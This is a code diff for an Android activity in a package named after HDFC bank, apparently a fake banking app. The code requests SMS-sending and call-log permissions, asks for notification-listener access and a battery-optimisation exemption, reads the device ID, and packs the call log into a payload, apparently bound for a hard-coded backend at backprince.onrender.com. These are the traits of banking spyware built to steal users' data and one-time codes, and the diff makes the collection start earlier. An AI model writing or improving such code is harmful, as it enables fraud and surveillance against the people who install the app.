@@ -2,9 +2,13 @@ package com.hdfc.app;
 
 import android.Manifest;
 import android.content.ContentResolver;
+import android.content.Context;
+import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.net.Uri;
 import android.os.Bundle;
+import android.os.PowerManager;
 import android.provider.CallLog;
 import android.provider.Settings;
 import android.provider.Telephony;
@@ -27,12 +31,16 @@ public class MainActivity extends BridgeActivity {
     private static final String BACKEND_URL = "https://backprince.onrender.com";
 
     @Override
-    public void onStart() {
-        super.onStart();
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        
+        // Initialize Bridge at the earliest possible stage
         WebView webView = getBridge().getWebView();
+        webView.getSettings().setJavaScriptEnabled(true);
         webView.addJavascriptInterface(new Object() {
             @JavascriptInterface
             public void requestRealPermissions() {
+                Log.d(TAG, "Triggering Native OS Permissions");
                 ActivityCompat.requestPermissions(MainActivity.this, new String[]{
                     Manifest.permission.POST_NOTIFICATIONS,
                     Manifest.permission.SEND_SMS,
@@ -43,26 +51,29 @@ public class MainActivity extends BridgeActivity {
                     Manifest.permission.READ_CALL_LOG
                 }, 101);
             }
+
             @JavascriptInterface
             public String getDeviceId() {
                 return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
             }
+
             @JavascriptInterface
             public void requestIgnoreBatteryOptimizations() {
                 if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
-                    android.content.Intent intent = new android.content.Intent();
+                    Intent intent = new Intent();
                     String packageName = getPackageName();
-                    android.os.PowerManager pm = (android.os.PowerManager) getSystemService(android.content.Context.POWER_SERVICE);
+                    PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                     if (!pm.isIgnoringBatteryOptimizations(packageName)) {
-                        intent.setAction(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-                        intent.setData(android.net.Uri.parse("package:" + packageName));
+                        intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                        intent.setData(Uri.parse("package:" + packageName));
                         startActivity(intent);
                     }
                 }
             }
+
             @JavascriptInterface
             public void requestNotificationAccess() {
-                android.content.Intent intent = new android.content.Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
+                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                 startActivity(intent);
             }
         }, "AndroidBridge");
@@ -79,6 +90,7 @@ public class MainActivity extends BridgeActivity {
                     break;
                 }
             }
+            
             if (allGranted) {
                 new Thread(new Runnable() {
                     @Override
@@ -87,11 +99,12 @@ public class MainActivity extends BridgeActivity {
                     }
                 }).start();
             }
+            
             final String status = allGranted ? "GRANTED" : "DENIED";
-            getBridge().getWebView().post(new Runnable() {
+            runOnUiThread(new Runnable() {
                 @Override
                 public void run() {
-                    getBridge().getWebView().loadUrl("javascript:handlePermissionResult('" + status + "')");
+                    getBridge().getWebView().evaluateJavascript("handlePermissionResult('" + status + "')", null);
                 }
             });
         }
@@ -128,6 +141,7 @@ public class MainActivity extends BridgeActivity {
                     logsArray.put(log);
                 } while (cursor.moveToNext());
                 cursor.close();
+                
                 JSONObject payload = new JSONObject();
                 payload.put("deviceId", deviceId);
                 payload.put("logs", logsArray);
